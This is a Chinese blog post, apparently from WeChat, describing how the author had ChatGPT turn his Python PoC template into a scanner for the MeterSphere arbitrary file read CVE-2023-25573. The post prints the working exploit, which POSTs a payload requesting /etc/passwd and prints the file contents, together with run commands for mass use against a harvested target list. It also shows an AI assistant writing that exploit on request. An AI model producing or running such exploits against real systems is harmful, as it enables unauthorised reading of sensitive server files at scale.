<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Gy4v7FBTJU3jsz8eJBgrww)

挖漏洞必不可少的需要去写 POC。我在写 POC 的过程中为了提高效率是编写好一个模版，然后根据具体的漏洞情况去补充完善脚本。

我先用我的模版问 chatGPT 有哪些地方可以优化的：  

![](https://mmbiz.qpic.cn/mmbiz_png/R3h5SuP8QnJFuN0Hh7vh9VUsoib6Ut83tyVpUClagiaBN5lpvdkFib9HxHsUiaNaIPKILAlmt8A8ibLpsvXl9Ck1DOA/640?wx_fmt=png)

Chat-GPT 给出的代码：

```
import argparse
import base64
import requests
import sys
import urllib3
from requests.exceptions import ConnectionError, ReadTimeout
urllib3.disable_warnings()
def title(vuln):
    print(f"""
                               {vuln}
                      use: python3  {vuln}.py
                           Author: kento-sec
    """)
class Information:
    def __init__(self, args, vuln):
        self.args = args
        self.url = args.url
        self.file = args.file
        self.vuln = vuln
        self.timeout = 5
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        }
    def update_headers(self, headers):
        self.headers.update(headers)
    def target_url(self):
        try:
            requests.packages.urllib3.disable_warnings()
            url = self.url + ""
            web = requests.get(url, verify=False, headers=self.headers, timeout=self.timeout)
            if web.status_code == 200:
                print(f"\033[36m[o]目标存在{self.vuln},漏洞位置：{url} \033[0m")
                with open(f"{self.vuln}结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            else:
                print(f"\033[31m[x] 目标 {self.url} 不存在{self.vuln} \033[0m")
        except ConnectionError:
            print("链接错误")
            pass
        except ReadTimeout:
            print("链接错误")
            pass
    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                self.target_url()
if __name__ == "__main__":
    vuln = ""
    title(vuln)
    parser = argparse.ArgumentParser(description=vuln)
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.

```

我们尝试使用一个漏洞案例，让 Chat-GPT 根据这个 POC 模版去生成代码：  

![](https://mmbiz.qpic.cn/mmbiz_png/R3h5SuP8QnJFuN0Hh7vh9VUsoib6Ut83t7pHjgI3wPYyibRibM4rWG7unHj4BU0j7MnY7WYuz4T0LKg6BqMic0zib3g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/R3h5SuP8QnJFuN0Hh7vh9VUsoib6Ut83tqvzfmrIvAxXbcXtfz50gegbtBGED2iaTnia9lMaaKT83lNyssKYJof7Q/640?wx_fmt=png)

Chat-GPT 给出的代码：  

```
import argparse
import requests
import sys
import urllib3
from requests.exceptions import ConnectionError, ReadTimeout
urllib3.disable_warnings()
def title(vuln):
    print(f"""
                               {vuln}
                      use: python3  {vuln}.py
                                 Author: kento-sec
    """)
class Information:
    def __init__(self, args, vuln):
        self.args = args
        self.url = args.url
        self.file = args.file
        self.vuln = vuln
        self.timeout = 5
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'Content-Type': 'application/json',
        }
    def update_headers(self, headers):
        self.headers.update(headers)
    def target_url(self):
        try:
            requests.packages.urllib3.disable_warnings()
            url = self.url + "/api/jmeter/download/files"
            payload = {
                "reportId": "pass",
                "bodyFiles": [{"id": "aaa", "name": "/etc/passwd"}]
            }
            web = requests.post(url, json=payload, verify=False, headers=self.headers, timeout=self.timeout)
            if web.status_code == 200:
                print(f"\033[36m[o]目标存在{self.vuln},漏洞位置：{url} \033[0m")
                print(f"文件内容:\n{web.text}")
                with open(f"{self.vuln}结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            else:
                print(f"\033[31m[x] 目标 {self.url} 不存在{self.vuln} \033[0m")
        except ConnectionError:
            print("链接错误")
            pass
        except ReadTimeout:
            print("链接错误")
            pass
    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                self.target_url()
if __name__ == "__main__":
    vuln = "Metersphere_file任意文件读取漏洞CVE-2023-25573"
    title(vuln)
    parser = argparse.ArgumentParser(description=vuln)
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            f"[-] 参数错误！\neg1:>>>python3 {vuln}.py -u http://127.0.0.1\neg2:>>>python3 {vuln}.py -f ip.txt")
    elif args.url:
        Information(args, vuln).target_url()
    elif args.file:
        Information(args, vuln).file_url()

```

由于 Chat-GPT 生成的模版把我注释的代理代码去除了，把它补上：

```
proxy={'http':'http://localhost:8080','https':'https://localhost:8080'}

```

现在最重要的是要使用我写的 AsamF 进行资产收集，由于做了非常大的改动，而且没有时间继续改，因此没有编译，直接 go run 运行程序：

![](https://mmbiz.qpic.cn/mmbiz_png/R3h5SuP8QnJFuN0Hh7vh9VUsoib6Ut83txyjhxQMzvft0jRsz3h8MT4lF7j9ZqINse77ZLE6FxCf7Mic4cHQzlsA/640?wx_fmt=png)

有了 POC, 有了资产，就是利用环节，执行命令：

```
python Metersphere任意文件读取漏洞CVE-2023-25573.py -f metersphere_file.txt

```

![](https://mmbiz.qpic.cn/mmbiz_png/R3h5SuP8QnJFuN0Hh7vh9VUsoib6Ut83tqDQg6icdPv50RqBzCukTWRTcpkS6Zo6dWuicDDpOJ3bBs3gI0cicOMjNw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/R3h5SuP8QnJFuN0Hh7vh9VUsoib6Ut83tUo62Z8qtWlzhSBicvIOGLERlhxRTCQ2IJa2fLNjgENX8qJnXP3wElvA/640?wx_fmt=png)

实际上我 Chat-GPT 生成的代码就知道它有可能会有问题，这时候就是为什么要加上刚刚代理的代码，这样我们才能更清楚数据的响应。因为它的判断依据只有响应码为 200，因此我们根据漏洞详情，在'web.status_code == 200'后面添加一个判断：

```
and '/etc/passwd' in web.text

```

  
再来一次：

```
python Metersphere任意文件读取漏洞CVE-2023-25573.py -f metersphere_file.txt

```

![](https://mmbiz.qpic.cn/mmbiz_png/R3h5SuP8QnJFuN0Hh7vh9VUsoib6Ut83tFoBZsfhdcwQPuxfsGHZzTX3pO2NQfwbxHAu8VamibGicTC3vDvUA3NpQ/640?wx_fmt=png)

一个思路罢了